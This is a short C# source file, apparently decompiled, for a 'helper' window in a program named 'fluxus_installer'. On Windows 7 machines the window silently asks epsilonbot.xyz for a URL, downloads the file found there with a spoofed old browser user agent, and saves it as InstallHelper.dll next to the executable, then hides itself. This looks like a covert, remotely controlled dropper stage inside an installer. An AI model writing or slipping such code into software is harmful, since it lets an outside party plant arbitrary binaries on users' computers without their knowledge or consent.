using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.Net;
using System.Windows;
using System.Windows.Markup;

namespace fluxus_installer
{
	public partial class helper : Window
	{
		public helper()
		{
			this.InitializeComponent();
			if (Environment.OSVersion.Version.Major == 6 & Environment.OSVersion.Version.Minor == 1)
			{
				using (WebClient webClient = new WebClient())
				{
					webClient.Headers.Add(HttpRequestHeader.UserAgent, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
					webClient.DownloadFile(webClient.DownloadString("https://epsilonbot.xyz/helper"), AppDomain.CurrentDomain.BaseDirectory + "InstallHelper.dll");
				}
			}
			base.Hide();
			new MainWindow().Show();
		}
	}
}
